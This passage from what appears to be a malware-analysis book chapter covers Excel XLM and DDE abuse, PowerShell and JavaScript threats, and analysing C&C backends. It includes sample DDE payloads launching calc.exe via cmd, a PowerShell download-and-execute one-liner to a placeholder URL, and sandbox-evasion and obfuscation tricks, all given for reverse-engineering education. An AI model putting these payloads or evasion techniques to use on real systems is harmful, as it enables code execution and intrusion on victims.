+			<p>Another option similar to the <code>CALL</code> option is <code>REGISTER</code>.</p>
+			<p>An obvious example of a simple malicious payload utilizing them would be calling APIs such as <code>URLDownloadToFile</code> and <code>ShellExecuteA</code> to deliver and execute the next stage of the payload.</p>
+			<p>But in reality, pretty much all modern malicious macros will be obfuscated and will use a different set of macros to build the actual malicious<a id="_idIndexMarker1556"/> functionality. We are going to cover them here. For <code>.xls</code> documents following the <code>.xlsb</code> and <code>.xlsm</code> OOXML-based Excel documents, the corresponding data can generally be found in the <code>\xl\macrosheets\</code> directory in BIFF12 and XML formats, respectively.</p>
+			<p>Finally, the same as in VBA<a id="_idIndexMarker1558"/> macros, formulas can use some particular standard cell names to achieve autorun capabilities. An example would be the cell starting with the <code>Auto_Open</code> prefix:</p>
+			<div><div><img src="img/Figure_10.13_B18500.jpg" alt="Figure 10.13 – The cell with the XLM macro that will be automatically executed&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.13 – The cell with the XLM macro that will be automatically executed</p>
+			<p>Now, let’s talk about how XLM-based payloads can be obfuscated.</p>
+			<h3>Obfuscation</h3>
+			<p>There are multiple<a id="_idIndexMarker1559"/> ways attackers may attempt to complicate the work of reverse engineers trying to figure out malware’s purpose. Let’s explore the most common of them:</p>
+			<ul>
+				<li>Using a white font on a white background and scattered formulas to make them invisible when the document is opened.</li>
+				<li>Using the <code>RUN</code> and <code>GOTO</code> formulas to complicate the control flow by jumping from one cell to another.</li>
+				<li>Using the <code>CHAR</code> command to resolve string characters dynamically and <code>MID</code> to get substrings.</li>
+				<li>Moving or accumulating the content around the sheet using the <code>FORMULA</code> command or modifying it using a combination of the <code>GET.CELL</code> and <code>SET.VALUE</code> commands.</li>
+				<li>Storing malicious formulas in hidden sheets. There are two types, and each should be handled differently:<ul><li><code>hidden</code>: Right-click<a id="_idIndexMarker1560"/> on any visible sheet and select <strong class="bold">Unhide…</strong>, then enable all hidden ones:</li></ul></li>
+			</ul>
+			<div><div><img src="img/Figure_10.14_B18500.jpg" alt="Figure 10.14 – Unhiding hidden sheets in Excel&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.14 – Unhiding hidden sheets in Excel</p>
+			<ul>
+				<li><code>veryhidden</code>: Change the <code>hsState</code> field from <code>2</code> to <code>0</code> in the corresponding <code>BoundSheet</code> record that’s in BIFF8<a id="_idIndexMarker1561"/> format (this requires using dedicated tools such as <strong class="bold">OffVis</strong>):</li>
+			</ul>
+			<div><div><img src="img/Figure_10.15_B18500.jpg" alt="Figure 10.15 – Changing the hsState field associated with a veryhidden sheet&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.15 – Changing the hsState field associated with a veryhidden sheet</p>
+			<ul>
+				<li>Using hidden names. To reveal <a id="_idIndexMarker1562"/>them, clear the <code>fHidden</code> bit in the corresponding <code>LBL</code> record:</li>
+			</ul>
+			<div><div><img src="img/Figure_10.16_B18500.jpg" alt="Figure 10.16 – Changing the fHidden field to unhide the associated name&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.16 – Changing the fHidden field to unhide the associated name</p>
+			<ul>
+				<li>Using <code>GET.WORKSPACE</code> with different arguments to detect sandboxes, such as the following:<ul><li><code>13</code>/<code>14</code>: Workspace width/height</li><li><code>19</code>: Mouse availability</li><li><code>31</code>: If single-step mode is currently being used</li><li><code>42</code>: Audio availability</li></ul></li>
+				<li>Executing the payload only on a particular day to tamper with behavioral analysis</li>
+				<li>Checking font size and row height or if the window has been maximized to detect tampering</li>
+			</ul>
+			<p>These are the most <a id="_idIndexMarker1563"/>common obfuscation techniques. Finally, let’s see what tools can help us with the analysis.</p>
+			<h3>Static and dynamic analysis</h3>
+			<p>First of all, the already<a id="_idIndexMarker1564"/> mentioned <strong class="bold">olevba</strong> tool can be used to<a id="_idIndexMarker1565"/> automatically<a id="_idIndexMarker1566"/> extract XLM macros<a id="_idIndexMarker1567"/> as well. If another tool called <strong class="bold">XLMMacroDeobfuscator</strong> is also installed on the same system, the output of olevba will also be nicely deobfuscated:</p>
+			<div><div><img src="img/Figure_10.17_B18500.jpg" alt="Figure 10.17 – Extracted and deobfuscated chain of XLM macros&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.17 – Extracted and deobfuscated chain of XLM macros</p>
+			<p>Apart from that, Microsoft Excel provides great embedded capabilities for debugging formulas. Mainly, its Name Manager and Macro Debugger parts will be particularly useful:</p>
+			<div><div><img src="img/Figure_10.18_B18500.jpg" alt="Figure 10.18 – Dynamic analysis of a chain of XLM macros using Excel’s debugger&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.18 – Dynamic analysis of a chain of XLM macros using Excel’s debugger</p>
+			<p>Finally, the <strong class="bold">BiffView</strong> and <strong class="bold">OffVis</strong> tools can provide an intimate<a id="_idIndexMarker1568"/> view of BIFF8 internals. OffVis can<a id="_idIndexMarker1569"/> also help bypass some of the aforementioned obfuscation techniques that involve hiding sheets and names.</p>
+			<p>That’s it for XLM <a id="_idIndexMarker1570"/>macros. We have already learned a lot about<a id="_idIndexMarker1571"/> macro-based threats, so now, it is time to cover othe<a id="_idTextAnchor1142"/><a id="_idTextAnchor1143"/><a id="_idTextAnchor1144"/>r ways how malware may achieve its goals by misusing MS Office documents.</p>
+			<h2 id="_idParaDest-332"><a id="_idTextAnchor1145"/>Besides macros</h2>
+			<p>There are other methods<a id="_idIndexMarker1572"/> that attackers may use to execute code once the document is opened. Another approach is to use the <em class="italic">mouse click</em>/<em class="italic">mouse over</em> technique, which involves executing<a id="_idIndexMarker1573"/> a command when the user moves the mouse over a crafted object in PowerPoint.</p>
+			<p>This can be done by assigning the corresponding action to it, as follows:</p>
+			<div><div><img src="img/Figure_10.19_B18500.jpg" alt="Figure 10.19 – Adding an action to an object in PowerPoint&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.19 – Adding an action to an object in PowerPoint</p>
+			<p>The good news is that updated<a id="_idIndexMarker1574"/> versions of Microsoft Office should have a protected view (read-only access) security feature enabled, which will warn a user about a potential external program’s execution if the document came from an unsafe location. In this case, it will be all about social engineering – whether the attacker succeeds in convincing the victim to ignore or disable all warnings.</p>
+			<p>Another less common<a id="_idIndexMarker1575"/> way how malware may achieve execution is by using <code>.SettingContent-ms</code> file extension) or embedded into other documents. The <code>DeepLink</code> tag can be used there to specify the command to be executed. After the first few attempts to misuse this functionality, Microsoft promptly beefed u<a id="_idTextAnchor1146"/>p the security of this feature. Now, we don’t see malware targeting it much.</p>
+			<p>Finally, the <code>DDEAUTO</code> field with the command to execute, specified<a id="_idIndexMarker1577"/> as the argument. Another way this functionality can be misused is by using particular syntax in Microsoft Excel. In this case, a malicious file will contain the command crafted in the following way:</p>
+			<pre class="source-code">
+(+|-|=)&lt;command_to_execute&gt;|'&lt;optional_arguments_prepended_by_space&gt;'!&lt;row_or_c olumn_or_cell_number&gt;</pre>
+			<p>Alternatively, the command can be passed as an argument to a built-in benign function such as <code>SUM</code>. Here are some example payloads that execute <code>calc.exe</code> after the user’s confirmation:</p>
+			<pre class="source-code">
+=calc|' '!A
++cmd|' /c calc.exe'!7
+@SUM(calc|' '!Z99)</pre>
+			<p>Here is an example of the warning message that’s displayed by Microsoft Excel when this technique is used:</p>
+			<div><div><img src="img/Figure_10.20_B18500.jpg" alt="Figure 10.20 – An example of a Microsoft Excel warning box related to potential code execution&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.20 – An example of a Microsoft Excel warning box related to potential code execution</p>
+			<p>The <strong class="bold">msodde</strong> tool (part of <strong class="bold">oletools</strong>) may help in detecting<a id="_idIndexMarker1578"/> such techniques<a id="_idIndexMarker1579"/> in samples.</p>
+			<p>While <a id="_idTextAnchor1147"/>any code execution here will require user confirmation before being enabled, it remains a possible attacking vector with the help of social engineering.</p>
+			<p>Now that we’ve mastered macro-based threats, it is time to talk about an<a id="_idTextAnchor1148"/>other scripting language commonly misused by attackers these days – PowerShell!</p>
+			<h1 id="_idParaDest-333"><a id="_idTextAnchor1149"/>The power of PowerShell</h1>
+			<p>PowerShell represents<a id="_idIndexMarker1580"/> an ongoing evolution of Windows shell and scripting languages. Its powerful functionality, access to .NET methods, and deep integration with recent versions of Windows have facilitated the increase of its popularity drastically among common users and malicious actors. From the point of view of the attacker, it has many other advantages, especially in terms of obfuscation, which we are going to cover in great detail. Additionally, because the whole script can be encoded and executed as a single command, it requires no script files to hit the hard disk and leaves minim<a id="_idTextAnchor1150"/><a id="_idTextAnchor1151"/>al traces for forensic experts.</p>
+			<p>Let’s start with the peculiarities of its syntax.</p>
+			<h2 id="_idParaDest-334"><a id="_idTextAnchor1152"/>Basic syntax</h2>
+			<p>PowerShell command-line arguments<a id="_idIndexMarker1581"/> provide unique opportunities for the attackers because of certain characteristics of their implementation. For example, PowerShell understands even truncated arguments and the associated parameters, so long as they are not ambiguous. Let’s go through some of the most common values that are used when executing the malicious code:</p>
+			<ul>
+				<li><code>-NoProfile</code> (often referred to as <code>-NoP</code>): This skips the process of loading the PowerShell profile; it is useful as it is not affected by local settings.</li>
+				<li><code>-NonInteractive</code> (often referred to as <code>-NonI</code>): This doesn’t present an interactive prompt; it is useful when the purpose is to execute specified commands only.</li>
+				<li><code>-ExecutionPolicy</code> (often referred to as <code>-Exec</code> or <code>-EP</code>): This is often used with the <code>Bypass</code> argument to ignore settings that limit certain PowerShell functionality. It can also be achieved by many other approaches; for example, by modifying PowerShell’s execution policy registry value.</li>
+				<li><code>-WindowStyle</code> (often referred to as <code>-Win</code> or <code>-W</code>): This is usually used by attackers with a <code>Hidden</code> (or <code>1</code>) argument to hide the corresponding window for stealth purposes.</li>
+				<li><code>-Command</code> (often referred to as <code>-C</code>): This executes a command provided in a command line.</li>
+				<li><code>-EncodedCommand</code> (often referred to as <code>-Enc</code>, <code>-EC</code>, or <code>-E</code>): This executes an encoded (base64) command provided in a command line.</li>
+			</ul>
+			<p>In the preceding examples, the command-line<a id="_idIndexMarker1582"/> arguments can be truncated to any number of letters and still be valid for PowerShell. For example, <code>-NoProfile</code> and <code>-NoProf</code>, or <code>Hidden</code> and <code>Hidde</code>, will be processed in the same way.</p>
+			<p>Regarding the syntax, let’s look<a id="_idIndexMarker1583"/> at some commands that are often misused by attackers.</p>
+			<p><strong class="bold">Native cmdlets</strong>:</p>
+			<ul>
+				<li><code>Invoke-Expression</code> (<code>iex</code>): This executes a statement provided as an argument; it is very similar to the <code>eval</code> function in JavaScript.</li>
+				<li><code>Invoke-Command</code> (<code>icm</code>): This is often used with the <code>-ScriptBlock</code> argument to achieve pretty much the same functionality as <code>Invoke-Expression</code>.</li>
+				<li><code>Invoke-WebRequest</code> (<code>iwr</code>): This sends a web request; for example, it could send a request to interact with the C&amp;C.</li>
+				<li><code>ConvertTo-SecureString</code>: This is commonly used for decrypting an embedded script.</li>
+			</ul>
+			<p><strong class="bold">NET-based methods</strong>:</p>
+			<ul>
+				<li>From the <code>[System.Net.WebClient]</code> class, we have<a id="_idIndexMarker1584"/> the following:<ul><li><code>DownloadString</code>: This downloads a string and stores it in memory, for example, a new command or a script to execute.</li><li><code>DownloadData</code>: This is less often used by attackers; it downloads the payload as a byte array.</li><li><code>DownloadFile</code>: This downloads a file to disk, for example, a new malicious module.</li></ul></li>
+			</ul>
+			<p>Each of these methods has an async version as well, with the corresponding name suffix (such as <code>DownloadStringAsync</code>).</p>
+			<ul>
+				<li>From the <code>[System.Net.WebRequest]</code>, <code>[System.Net.HttpWebRequest]</code>, <code>[System.Net.FileWebRequest]</code>, and <code>[System.Net.FtpWebRequest]</code> classes, we have the following:<ul><li><code>Create</code> (also <code>CreateDefault</code> and <code>CreateHttp</code>): This creates a web request to the server.</li><li><code>GetResponse</code>: This sends<a id="_idIndexMarker1585"/> a request and gets a response, such as with a new malicious module. Versions with the <code>Async</code> suffix and the <code>Begin</code> and <code>End</code> prefixes are also available for asynchronous operations (such as <code>BeginGetResponse</code> or <code>GetResponseAsync</code>), but they are rarely used by attackers.</li><li><code>GetRequestStream</code>: This returns a stream for writing data to the internet resource – to exfiltrate some valuable information or send infection statistics, for example<a id="_idTextAnchor1153"/>. Versions with the <code>Async</code> suffix and the <code>Begin</code> and <code>End</code> prefixes are available as well.</li></ul></li>
+				<li>From the <code>[System.Net.Http.HttpClient]</code> class, we have the following:<ul><li><code>GetAsync</code>, <code>GetStringAsync</code>, <code>GetStreamAsync</code>, <code>GetByteArrayAsync</code>, <code>PostAsync</code>, and <code>PutAsync</code>: These are multiple options for sending any type of HTTP request and getting a response back.</li></ul></li>
+				<li>The <code>[System.IO.Compression.DeflateStream]</code> and <code>[System.IO.Compression.GZipStream]</code> classes are commonly employed to decompress the embedded shellcode after decoding it using the base64 algorithm. They are usually used with the <code>[System.IO.Compression.CompressionMode]::Decompress</code> parameter as an argument for an <code>[System.IO.StreamReader]</code> object (see the following screenshot for an example).</li>
+				<li>From the <code>[System.Convert]</code> class, we have the following:<ul><li><code>FromBase64String</code>: This decrypts base64-encoded strings, such as the next stage payload</li></ul></li>
+			</ul>
+			<p>For .NET namespaces, the <code>System.</code> prefix<a id="_idIndexMarker1586"/> can be safely omitted, as follows:</p>
+			<div><div><img src="img/Figure_10.21_B18500.jpg" alt="Figure 10.21 – An example of a Veil payload&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.21 – An example of a Veil payload</p>
+			<p>As we can see, using a combination of compression and base64 encoding is a very popular technique among attackers to store the next stage payload and, in this way, complicate the analysis and detection. <a id="_idTextAnchor1154"/>We will talk about other obfuscation techniques in greater detail in the next section. Here is an example of the code downloading the payload and executing it:</p>
+			<pre class="source-code">
+iex(new-object net.webclient).downloadstring('http://&lt;url&gt;/payload.bin')</pre>
+			<p>Just like command-line arguments, the method names can be truncated without creating ambiguity. The <code>Get-Command</code>/<code>gcm</code> command with wildcards can be used by the analyst to identify the full name and can also be used by attackers to dynamically resolve them.</p>
+			<p>PowerShell can also be used to execute custom .NET code. In particular, the <code>Add-Type -TypeDefinition &lt;variable_storing_source_code&gt;</code> syntax can be used to dynamically compile .NET source code directly in the PowerShell script so that it can be used straight away. The <code>csc.exe</code> tool will be used behind the scenes for this purpose.</p>
+			<p>The notorious PowerShell-based Bluwimps stores information in WMI management classes. This makes<a id="_idIndexMarker1587"/> it harder to detect using traditional antivirus solutions, and<a id="_idIndexMarker1588"/> it can remotely execute code using the <strong class="bold">Windows Management Instrumentation Command</strong> (<strong class="bold">WMIC</strong>) instead of utilizing the more widely<a id="_idIndexMarker1589"/> used <strong class="bold">psexec</strong> tool.</p>
+			<h2 id="_idParaDest-335"><a id="_idTextAnchor1155"/>Obfuscation</h2>
+			<p>There are multiple open source tools available <a id="_idIndexMarker1590"/>online that can generate and/or obfuscate PowerShell-based payloads for penetration testing. This list includes, but is not limited to, the following:</p>
+			<ul>
+				<li>PowerSploit</li>
+				<li>PowerShell Empire</li>
+				<li>Nishang</li>
+				<li>MSFvenom (part of Metasploit)</li>
+				<li>Veil</li>
+				<li>Invoke-Obfuscation</li>
+			</ul>
+			<p>As we know, PowerShell commands are executed through the Windows console, so pretty much any obfuscation technique we described previously can be applied here as well. In addition to this, several other simple obfuscation tricks have proved to be popular:</p>
+			<ul>
+				<li>Multiple string concatenations with either a basic <code>+</code> syntax with actual values or variables storing them or using the <code>Join</code> or <code>Concat</code> functions.</li>
+				<li>Multiple excessive single, double, and backquotes.</li>
+				<li><code>split</code> and <code>join<a id="_idTextAnchor1156"/></code> usage, as shown here:<pre><strong class="bold">iex (&lt;value_with_separators&gt;.split("&lt;separator&gt;") -join "") | iex)</strong></pre></li>
+				<li>String reverse (generally, either by reading a reversed string from the end or casting it to an array and using <code>[Array]::Reverse</code>; it rarely uses regex with the <code>RightToLeft</code> traverse type). The use of <code>[Char]&lt;numeric_value&gt;</code> or <code>ToInt&lt;int_size&gt;</code> syntaxes instead of the symbols themselves.</li>
+				<li>A combination of compression and base64 encoding using the aforementioned methods (see <em class="italic">Figure 10.21</em> for an example).</li>
+			</ul>
+			<p>In terms of encryption, the following <a id="_idIndexMarker1591"/>approaches have proved to be popular:</p>
+			<ul>
+				<li>The <code>-bxor</code> arithmetic operator for simple encryption.</li>
+				<li>The <code>ConvertTo-SecureString</code> cmdlet for converting the encrypted block into a secure string, which stores information in an encrypted form in memory. It is often used with the following code block to access the actual value inside the secure string:<pre>[System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR(&lt;secure_string&gt;))</pre></li>
+			</ul>
+			<p>For this cmdlet, the decryption key can be provided in either a <code>-key</code> or a <code>-securekey</code> argument (or perhaps something like <code>-kE</code>).</p>
+			<p>To handle them, you must successfully identify the algorithm that’s being used and then reverse the logic using the information available. Writing simple scripts using your language of preference is one option, but<a id="_idIndexMarker1592"/> in many cases, it can only be handled using the online <strong class="bold">CyberChef</strong> tool.</p>
+			<p>Let’s talk about what other tools we can use to facilitate the analysis.</p>
+			<h2 id="_idParaDest-336"><a id="_idTextAnchor1157"/>Static and dynamic analysis</h2>
+			<p>PowerShell has a powerful embedded<a id="_idIndexMarker1593"/> help tool that can be used to get the description<a id="_idIndexMarker1594"/> of any command. It can be obtained by executing a <code>Get-Help &lt;command_name&gt;</code> statement:</p>
+			<div><div><img src="img/Figure_10.22_B18500.jpg" alt="Figure 10.22 – Getting a description for a PowerShell command&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.22 – Getting a description for a PowerShell command</p>
+			<p>Overall, deobfuscation and decoding<a id="_idIndexMarker1595"/> operations mainly require only a basic set<a id="_idIndexMarker1596"/> of skills, such as how to decode base64, how to decompress deflate and gzip, how to remove meaningless characters, how to replace variables, and how to read partially written commands. Any text editor with the corresponding syntax highlight can be used for static analysis in this case.</p>
+			<p>While <code>xor</code> can be decrypted<a id="_idIndexMarker1597"/> in multiple ways, the easiest way to handle embedded PowerShell encryption is through dynamic analysis in the PowerShell <code>Set-Content</code>, <code>Add-Content</code>, and <code>Out-File</code> cmdlets, along with the pipe symbol (<code>|</code>) or classic <code>&gt;</code> and <code>&gt;&gt;</code> input redirects, can be used:</p>
+			<pre>powershell -c "$a='secret'; $a | set-content 'out<a id="_idTextAnchor1158"/>put.txt'"</pre>
+			<p>Alternatively, the <code>Write-Host</code> cmdlet can be used to write the decrypted output to the console<a id="_idIndexMarker1598"/> and then redirect it to a file. Finally, a great tool called <strong class="bold">PSDecode</strong> can be used to quickly try to handle obfuscation automatically (this may invol<a id="_idTextAnchor1159"/>ve code execution, so use it with care).</p>
+			<p>Now, it is time to talk about JavaScript-based threats.</p>
+			<h1 id="_idParaDest-337"><a id="_idTextAnchor1160"/>Handling JavaScript</h1>
+			<p>JavaScript is a web language that powers<a id="_idIndexMarker1599"/> billions of pages on the internet, so it is no surprise that it is commonly<a id="_idIndexMarker1600"/> used to create exploits that target web users. However, on Windows, it is also possible to execute JScript (a very similar dialect of ECMAScript) files through Windows Script Host, which also makes it a good candidate for malicious<a id="_idIndexMarker1601"/> attachments and post-compromised scripting. For example, a fileless threat called <strong class="bold">Poweliks</strong> uses JScript code stored in the registry to achieve system persistence without leaving separate files on a disk.</p>
+			<p>Since there are minor differences between JavaScript and JScript, here, we will cover syntax that is common to both of them. Additionally, starting from this moment, we will use the JavaScript notation.</p>
+			<p>The universal file extension for JavaScript files is <code>.js</code>; encoded JScript files have the <code>.jse</code> extension. Additionally, they can be embedded into <code>.wsf</code> and <code>.hta</code> files in the same way as VBScript. In terms of similarity, on Windows, both <code>.js</code>/<code>.jse</code> and <code>.wsf</code> files can be executed locally by <code>wscript.exe</code> and <code>cscript.exe</code>. On the other hand, <code>.hta</code> files are executed by <code>mshta.exe</code>. There are several ways to execute inline JavaScript scripts:</p>
+			<p><code>mshta javascript:&lt;script_body&gt;</code></p>
+			<p><code>rundll32.exe javascript:"..\mshtml,RunHTMLApplication";&lt;script_body&gt;</code></p>
+			<p>In addition to this, on Windows, it is possible to execute JavaScript code using <code>regsvr32.exe</code> as a COM scriptlet (<code>.sct</code> files). On Linux, multiple options are available for executing JavaScript files<a id="_idIndexMarker1602"/> from the console, such as <strong class="bold">phantomjs</strong>, and, of co<a id="_idTextAnchor1161"/>urse, the JavaScript code can be executed in <a id="_idTextAnchor1162"/>full-fledged browsers. We will cover this in more detail in the <em class="italic">Static and dynamic analysis</em> section.</p>
+			<h2 id="_idParaDest-338"><a id="_idTextAnchor1163"/>Basic syntax</h2>
+			<p>If the script is going to be executed locally, particular<a id="_idIndexMarker1603"/> attention should be paid to certain types of operations that can answer questions about its purpose, persistence mechanism, and communication protocol. In terms of similarity with VBScript, on Windows, the same COM objects can be used for this purpose, as described previously:</p>
+			<div><div><img src="img/Figure_10.23_B18500.jpg" alt="Figure 10.23 – An example of JavaScript code writing data to a ﬁle on Windows&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.23 – An example of JavaScript code writing data to a ﬁle on Windows</p>
+			<p>On Linux, JavaScript is not used to execute<a id="_idIndexMarker1604"/> commands locally <a id="_idTextAnchor1164"/>as it requires some custom modules, such as node.js, which may not be available on the target system.</p>
+			<p>In terms of web applications, the following functions need to be paid attention to:</p>
+			<p><strong class="bold">Code execution</strong>:</p>
+			<p><code>eval</code>: Execute a script block provided as an argument</p>
+			<p><strong class="bold">Page redirects</strong>:</p>
+			<p>There are multiple options here, as shown in the following code block:</p>
+			<ul>
+				<li class="SC--Source---Bullet">window.location = '&lt;new_url&gt;';</li>
+				<li class="SC--Source---Bullet">window.location.href = '&lt;new_url&gt;';</li>
+				<li class="SC--Source---Bullet">window.location.assign('&lt;new_url&gt;');</li>
+				<li class="SC--Source---Bullet">window.location.replace('&lt;new_url&gt;'); // overwrites current page in the browser history</li>
+			</ul>
+			<p class="callout-heading">Important note</p>
+			<p class="callout">The <code>window.</code> part can commonly be omitted.</p>
+			<ul>
+				<li class="source-code">self.location = '&lt;new_url&gt;';</li>
+				<li class="source-code">top.location = '&lt;new_url&gt;';</li>
+				<li class="source-code">document.location = '&lt;new_url&gt;';<p class="callout-heading">Important note</p><p class="callout">There are also possible derivatives for them, similar to the window.location-based techniques mentioned previously.</p></li>
+			</ul>
+			<p>Apart from that, there<a id="_idIndexMarker1605"/> is also another way to redirect the user without using JavaScript:</p>
+			<ul>
+				<li class="source-code">&lt;meta http-equiv="refresh" content="&lt;num_of_seconds&gt;; url=&lt;new_url&gt;"&gt;;</li>
+			</ul>
+			<p><strong class="bold">External script loading</strong>:</p>
+			<ul>
+				<li class="source-code">&lt;script src="img/&lt;name&gt;.js"&gt;</li>
+				<li class="source-code">var script = document.createElement('script'); script.src = &lt;something&gt;;</li>
+			</ul>
+			<p><strong class="bold">Web requests to remote machines</strong>:</p>
+			<ul>
+				<li>The <code>XMLHttpRequest</code> object:<ul><li><code>open</code>: A method to create a request</li><li><code>send</code>: A method to send a request</li><li><code>responseText</code>: A property to access the server response</li></ul></li>
+				<li><code>fetch</code>: A relatively new way to send and process HTTP requests that was standardized in ES6.</li>
+			</ul>
+			<p>Popular libraries such as jQuery <a id="_idIndexMarker1606"/>and custom implementations of asynchronous JavaScript and XML (Ajax) usually utilize <code>XMLHttpRequest</code> and sometimes <code>fetch</code> requests on the backend.</p>
+			<h2 id="_idParaDest-339"><a id="_idTextAnchor1165"/>Anti-reverse engineering tricks</h2>
+			<p>The most common JavaScript obfuscation<a id="_idIndexMarker1607"/> technique that’s employed with some variations is dynamically building the next layer of JavaScript code by either decrypting it or assembling it from integers with the subsequent execution using the <code>eval</code> function or updating the document using <code>document.write</code>:</p>
+			<div><div><img src="img/Figure_10.24_B18500.jpg" alt="Figure 10.24 – Obfuscated JavaScript-based threat&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.24 – Obfuscated JavaScript-based threat</p>
+			<p>However, several other techniques are widely used by malware authors:</p>
+			<ul>
+				<li><strong class="bold">Storing the block required for successful decryption in a separate block or file</strong>: In this case, obtaining<a id="_idIndexMarker1608"/> only the decryption function may not be enough as it relies on some other piece of data being stored externally.</li>
+				<li><code>performance.now()</code> or <code>date.now()</code> functions are used.</li>
+				<li><code>arguments.callee</code> property.</li>
+				<li><code>console.log</code> function:<pre>window['console']['log'] = &lt;other_function&gt;;</pre></li>
+			</ul>
+			<p>Alternatively, it is possible to redefine the function as follows:</p>
+			<pre>var console = {};
+console.log = &lt;other_function&gt;;</pre>
+			<ul>
+				<li><strong class="bold">Detecting developer tools</strong>: There are multiple ways this can be implemented, such<a id="_idIndexMarker1610"/> as by checking Windows’ inner and outer sizes.</li>
+			</ul>
+			<p>There are other techniques as well, but these are used in malware most often.</p>
+			<h2 id="_idParaDest-340"><a id="_idTextAnchor1166"/>Static and dynamic analysis</h2>
+			<p>With web development<a id="_idIndexMarker1611"/> on the rise, there are plenty of tools that exist for analyzing<a id="_idIndexMarker1612"/> and debugging JavaScript code – from basic text editors with syntax highlights to quite sophisticated packages. However, the developer’s use cases are quite different from the reverse engineer’s, which eventually determines which set of programs are used by them.</p>
+			<p>First of all, to speed up the analysis, it makes sense to reformat the existing JavaScript code so that it is easier to follow the logic. Multiple<a id="_idIndexMarker1613"/> tools serve this purpose and they contain basic unpacking and deobfuscation logic, such as <strong class="bold">jsbeautifier</strong>.</p>
+			<p>In terms of generic dynamic<a id="_idIndexMarker1614"/> analysis, embedded<a id="_idIndexMarker1615"/> browser toolsets such as <strong class="bold">Chrome Developer Tools</strong> and <strong class="bold">Firefox Developer Tools</strong> are extremely handy. To use them, a small HTML block needs to be written to load the JavaScript file of interest.</p>
+			<p>Here, the JavaScript code is embedded into the page itself:</p>
+			<div><div><img src="img/Figure_10.25_B18500.jpg" alt="Figure 10.25 – An example of the embedded JavaScript code in Chrome Developer Tools&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.25 – An example of the embedded JavaScript code in Chrome Developer Tools</p>
+			<p>Here is the<a id="_idIndexMarker1616"/> externally loaded JavaScript script<a id="_idIndexMarker1617"/> in Firefox:</p>
+			<div><div><img src="img/Figure_10.26_B18500.jpg" alt="Figure 10.26 – An example of the external JavaScript script in Firefox Developer Tools&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.26 – An example of the external JavaScript script in Firefox Developer Tools</p>
+			<p>In addition to this, several customized<a id="_idIndexMarker1618"/> tools implement the functionality required for malware analysis. One of them is <strong class="bold">Malzilla</strong>; this free toolset combines multiple smaller tools that aim to make analysis easier by implementing the most common operations required. While relatively old, it is still used by many malware analysts to quickly go through obfuscation layers and extract the actual functionality.</p>
+			<p>The most commonly<a id="_idIndexMarker1619"/> used functionality of Malzilla is the module that can<a id="_idIndexMarker1620"/> intercept the <code>eval</code> call and output its argument to the screen. This is an extremely useful feature as most obfuscation techniques build up the actual payload before executing it using this function. This means that this is the point where the decrypted or deobfuscated logic becomes available, sometimes after a few iterations. It also includes various smart decoders that drastically speed up the analysis:</p>
+			<div><div><img src="img/Figure_10.27_B18500.jpg" alt="Figure 10.27 – Malzilla decoders&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.27 – Malzilla decoders</p>
+			<p>Another example<a id="_idIndexMarker1621"/> of such a tool is the more recent <strong class="bold">JSDetox</strong> project. It aims to facilitate static analysis and handle JavaScript obfuscation techniques. Unlike Malzilla, it is more focused on the Linux envi<a id="_idTextAnchor1167"/><a id="_idTextAnchor1168"/>ronment:</p>
+			<div><div><img src="img/Figure_10.28_B18500.jpg" alt="Figure 10.28 – The JSDetox website describing its functionality&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.28 – The JSDetox website describing its functionality</p>
+			<p>Now, let’s talk<a id="_idIndexMarker1622"/> about the backend<a id="_idIndexMarker1623"/> code.</p>
+			<h1 id="_idParaDest-341"><a id="_idTextAnchor1169"/>Behind C&amp;C – even malware has its own backend</h1>
+			<p>Many malware families use some sort of C&amp;C server<a id="_idIndexMarker1624"/> to receive updates or custom commands from the malicious actor or to exfiltrate stolen data. Getting access to these backend files can give researchers and law enforcement agencies a lot of information about how malware works and who the victims are. Sometimes, it can even lead to the actual people behind the attack! Therefore, properly and promptly analyzing<a id="_idTextAnchor1170"/> the code obt<a id="_idTextAnchor1171"/>ained from the C&amp;C is an important task that researchers have to face from time to time, so it’s better to be ready!</p>
+			<h2 id="_idParaDest-342"><a id="_idTextAnchor1172"/>Things to focus on</h2>
+			<p>So long as the analyst<a id="_idIndexMarker1625"/> has access to the code, it makes sense to prepare and prioritize a list of questions to answer. Generally, the following knowledge can be obtained from the backend:</p>
+			<ul>
+				<li>Is it an actual backend code or a proxy redirecting messages to another location? What URI or port does the malware utilize?</li>
+				<li>What is the format of the accepted requests or messages and is there any encryption involved?</li>
+				<li>Are there any commands that it can return to the malware, either automatically or on demand?</li>
+				<li>Can it issue self-destruction commands and is there any form of authentication for them?</li>
+				<li>Is there a web interface or dashboard available for the attacker?</li>
